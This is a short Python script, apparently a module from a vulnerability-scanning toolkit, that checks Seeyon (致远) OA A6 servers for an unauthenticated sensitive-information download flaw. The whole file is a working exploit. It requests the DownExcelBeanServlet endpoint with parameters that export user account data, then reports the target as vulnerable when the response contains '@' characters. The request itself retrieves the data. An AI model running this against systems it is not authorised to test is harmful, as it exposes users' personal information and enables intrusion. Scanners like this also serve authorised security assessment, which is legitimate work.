import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 致远OA_A6_DownExcelBeanServlet_用户敏感信息下载(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    vuln_url = urldata + "yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        response = requests.get(vuln_url, headers=headers, timeout=5)
        if "@" in response.text and response.status_code == 200:
            print(Vcolors.RED + "[+] 目标存在致远OA A6 DownExcelBeanServlet 用户敏感信息下载漏洞, 下载地址: {}\r".format(vuln_url) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在致远OA A6 DownExcelBeanServlet 用户敏感信息下载漏洞\r" + Vcolors.ENDC)
    except:
        logging.error("致远OA_A6_DownExcelBeanServlet_用户敏感信息下载脚本出现异常")



